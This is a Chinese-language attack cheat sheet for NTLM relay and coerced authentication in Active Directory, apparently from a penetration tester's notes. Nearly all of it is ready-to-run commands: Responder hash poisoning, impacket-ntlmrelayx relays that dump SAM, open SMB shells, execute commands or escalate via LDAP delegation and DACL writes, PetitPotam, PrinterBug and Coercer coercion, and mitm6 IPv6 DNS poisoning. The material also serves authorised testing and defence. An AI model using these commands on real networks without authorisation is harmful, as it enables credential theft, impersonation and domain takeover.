---
os: linux
service: AD
syntax: impacket-ntlmrelayx -tf targets.txt -smb2support
tags:
  - cmd
---

# NTLM Relay 与强制认证

## 原理
- LLMNR / NBT-NS / mDNS 投毒：Responder 响应广播解析请求，诱导目标把 NetNTLMv2 hash 发给攻击机
- NTLM Relay：把抓到的认证转发到另一台未开 SMB 签名的机器，实现身份冒用
- 强制认证（coercion）：主动让目标机器以「机器账户」身份向攻击机发起认证（PetitPotam / PrinterBug / Coercer）

## 前提
- 处于内网，能收到广播/组播流量（同网段或可达）
- 目标开启了 LLMNR / NBT-NS（Responder 抓 hash 用）
- Relay 目标未强制 SMB 签名
- coercion 触发的是机器账户认证，身份是 SYSTEM

## 前置检查

### 检查 SMB 签名（relay 目标必须「enabled but not required」）
```bash
nmap --script smb2-security-mode.nse -p445 <IP>
```

### 关闭 Responder 的 SMB / HTTP（relay 前必做，否则 445/80 被占）
```bash
sed -i 's/SMB = On/SMB = Off/g; s/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf
grep -E 'SMB|HTTP' /usr/share/responder/Responder.conf
```

## 利用步骤

### 1. Responder 抓 hash（被动投毒）
```bash
responder -I tun0 -dwPv
```
- `-d` DHCP 应答、`-w` WPAD、`-P` 强制 NTLM、`-v` verbose
- hash 落在 `/usr/share/responder/logs/`，用 `hashcat -m 5600` 破解

### 2. NTLM Relay（dump SAM / 交互 / 执行）
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```
- `targets.txt` 每行一个未强制 SMB 签名的目标 IP
- 抓到认证后自动 dump 目标 SAM（需管理员账户）
- `-i`：起交互式 SMB shell（可执行 whoami 等）
- `-c "<command>"`：直接执行命令

relay 到 LDAP 做 RBCD：
```bash
impacket-ntlmrelayx -t ldap://<DC> --delegate-access --no-dump --no-da --no-acl --escalate-user <USER>
```
- 让受害者机器账户被授权委派到 `<USER>`，之后用 getST 拿票据

relay 到 LDAP 写 DACL（提权）：
```bash
impacket-ntlmrelayx -t ldap://<DC> --escalate-user <USER>
```

### 3. 强制认证（coercion）
PetitPotam：
```bash
python3 PetitPotam.py <LHOST> <IP>
# <LHOST> = 攻击机 IP，<IP> = 目标机器 IP
```
- 触发目标机器账户向 `<LHOST>` 发起认证，配合 relay / Responder 收割

PrinterBug（spoolss）：
```bash
python3 printerbug.py <DOMAIN>/<USER>:<PASS>@<IP> <LHOST>
```

Coercer（批量测多种 coercion 方法）：
```bash
python3 Coercer.py coerce -u <USER> -p <PASS> -d <DOMAIN> -t <IP> -l <LHOST>
python3 Coercer.py scan -u <USER> -p <PASS> -d <DOMAIN> -t <IP>
```

### 4. mitm6（IPv6 DNS 投毒）配合 relay
```bash
# 终端1：投毒
mitm6 -d <DOMAIN>
# 终端2：relay
impacket-ntlmrelayx -6 -t ldap://<DC> --delegate-access --escalate-user <USER>
```
- mitm6 响应内网 DHCPv6 / DNS 请求，把流量导向自己，配合 relay 收割机器账户认证

## 常见坑
- 没关 Responder 的 SMB/HTTP 就开 relay，端口被占导致 ntlmrelayx 起不来
- relay 目标必须「未强制 SMB 签名」，否则报 signing 错误
- coercion 认证来自机器账户而非用户，relay 到 SMB 时只有目标对机器账户有本地管理员才有意义
- mitm6 需要目标支持 IPv6 且能收到 DHCPv6 请求

## 参考开源项目
- impacket (https://github.com/fortra/impacket)
- PetitPotam (https://github.com/topotam/PetitPotam)
- Coercer (https://github.com/p0dalirius/Coercer)
- mitm6 (https://github.com/dirkjanm/mitm6)
